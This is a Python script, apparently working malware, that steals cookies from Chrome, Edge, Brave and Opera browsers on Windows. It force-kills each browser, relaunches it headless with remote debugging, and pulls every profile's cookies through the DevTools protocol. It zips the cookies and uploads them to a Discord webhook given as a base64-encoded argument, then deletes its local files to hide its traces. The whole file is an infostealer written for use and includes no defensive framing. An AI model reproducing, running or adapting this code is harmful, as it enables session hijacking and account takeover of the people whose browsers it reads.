import os
import json
import subprocess
import websocket
import requests
import sqlite3
import base64
import argparse
import zipfile

DEBUG_PORT = 9222
LOCAL_APP_DATA = os.getenv('LOCALAPPDATA')
APP_DATA = os.getenv('APPDATA')
PROGRAM_FILES = os.getenv('ProgramFiles')
PROGRAM_FILES_X86 = os.getenv('ProgramFiles(x86)')

# Browser configurations
BROWSERS = {
    'chrome': {
        'bin': rf"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        'user_data': rf'{LOCAL_APP_DATA}\\Google\\Chrome\\User Data'
    },
    'edge': {
        'bin': rf"{PROGRAM_FILES_X86}\\Microsoft\\Edge\\Application\\msedge.exe",
        'user_data': rf'{LOCAL_APP_DATA}\\Microsoft\\Edge\\User Data'
    },
    'brave': {
        'bin': rf"{PROGRAM_FILES}\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
        'user_data': rf'{LOCAL_APP_DATA}\\BraveSoftware\\Brave-Browser\\User Data'
    },
    'opera': {
        'bin': rf"{LOCAL_APP_DATA}\\Programs\\Opera\\opera.exe",
        'user_data': rf'{APP_DATA}\\Opera Software\\Opera Stable'
    },
    'opera_gx': {
        'bin': rf"{LOCAL_APP_DATA}\\Programs\\Opera GX\\opera.exe",
        'user_data': rf'{APP_DATA}\\Opera Software\\Opera GX Stable'
    }
}

OUTPUT_DIR = "./cook"
os.makedirs(OUTPUT_DIR, exist_ok=True)

def decode_base64(encoded_str):
    """Decode a Base64 encoded string."""
    try:
        return base64.b64decode(encoded_str).decode('utf-8')
    except Exception as e:
        print(f"Error decoding Base64 string: {e}")
        return None

def get_debug_ws_url():
    try:
        res = requests.get(f'http://localhost:{DEBUG_PORT}/json')
        data = res.json()
        return data[0]['webSocketDebuggerUrl']
    except Exception as e:
        print(f"Error fetching WebSocket URL: {e}")
        return None

def kill_browser(browser_name):
    executable = os.path.basename(BROWSERS[browser_name]['bin'])
    subprocess.run(f'taskkill /F /IM {executable}', check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_debugged_browser(browser_name, profile):
    browser_config = BROWSERS[browser_name]
    subprocess.Popen([
        browser_config['bin'],
        f'--remote-debugging-port={DEBUG_PORT}',
        '--remote-allow-origins=*',
        '--headless',
        f'--user-data-dir={browser_config["user_data"]}',
        f'--profile-directory={profile}'
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def get_all_profiles(browser_name):
    profiles = []
    user_data_dir = BROWSERS[browser_name]['user_data']
    if os.path.exists(user_data_dir):
        for entry in os.listdir(user_data_dir):
            entry_path = os.path.join(user_data_dir, entry)
            if os.path.isdir(entry_path) and (
                entry == "Default" or entry.startswith("Profile ")
            ):
                profiles.append(entry)
    return profiles

def fetch_cookies_from_profile(browser_name, profile):
    print(f"Processing profile: {profile} for {browser_name}")
    kill_browser(browser_name)
    start_debugged_browser(browser_name, profile)

    url = None
    for _ in range(10):  # Retry logic to wait for browser to start
        url = get_debug_ws_url()
        if url:
            break

    if not url:
        print(f"Failed to connect to debugger for profile: {profile}")
        return []

    ws = websocket.create_connection(url)
    ws.send(json.dumps({'id': 1, 'method': 'Network.getAllCookies'}))
    response = ws.recv()
    ws.close()
    kill_browser(browser_name)

    response = json.loads(response)
    cookies = response.get('result', {}).get('cookies', [])
    return cookies

def save_cookies_to_file(cookies, browser_name, profile_name):
    output_file = os.path.join(OUTPUT_DIR, f"{browser_name}_{profile_name}_cookies.txt")
    with open(output_file, "w") as f:
        f.write("# Netscape HTTP Cookie File\n")
        f.write("# This is a generated file! Do not edit.\n\n")

        for c in cookies:
            domain = c.get("domain", "")
            secure = "TRUE" if c.get("secure", False) else "FALSE"
            path = c.get("path", "/")
            expires = c.get("expires", 0)  # Unix timestamp
            name = c.get("name", "")
            value = c.get("value", "")
            f.write(f"{domain}\t{secure}\t{path}\t{secure}\t{expires}\t{name}\t{value}\n")

    print(f"Cookies for {browser_name} profile '{profile_name}' saved to {output_file}")
    return output_file

def zip_cookies():
    zip_path = os.path.join(OUTPUT_DIR, "cookies.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, _, files in os.walk(OUTPUT_DIR):
            for file in files:
                if file.endswith("_cookies.txt"):
                    zipf.write(os.path.join(root, file), arcname=file)
    print(f"All cookies zipped into {zip_path}")
    return zip_path

def send_to_discord(embed_data, file_path, webhook_url):
    with open(file_path, "rb") as f:
        files = {"file": (os.path.basename(file_path), f)}
        response = requests.post(webhook_url, data={"payload_json": json.dumps(embed_data)}, files=files)
        if response.status_code == 204:
            print("Successfully sent data to Discord.")
        else:
            print(f"Failed to send data to Discord: {response.status_code} {response.text}")

    # Delete files after sending
    os.remove(file_path)
    for root, _, files in os.walk(OUTPUT_DIR):
        for file in files:
            os.remove(os.path.join(root, file))
    os.rmdir(OUTPUT_DIR)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Extract cookies and send to Discord.")
    parser.add_argument("webhook_base64", type=str, help="Base64-encoded Discord webhook URL.")
    args = parser.parse_args()

    webhook_url = decode_base64(args.webhook_base64)
    if not webhook_url:
        print("Invalid webhook URL provided.")
        exit(1)

    embed = {
        "embeds": [
            {
                "title": "Cookie Extraction Report",
                "description": "Details of extracted cookies",
                "color": 16711680,
                "fields": []
            }
        ]
    }

    for browser_name in BROWSERS:
        profiles = get_all_profiles(browser_name)
        total_cookies = 0

        for profile in profiles:
            cookies = fetch_cookies_from_profile(browser_name, profile)
            total_cookies += len(cookies)
            if cookies:
                save_cookies_to_file(cookies, browser_name, profile)

        embed["embeds"][0]["fields"].append({
            "name": browser_name.capitalize(),
            "value": f"{total_cookies} cookies extracted",
            "inline": True
        })

    zip_file = zip_cookies()
    send_to_discord(embed, zip_file, webhook_url)
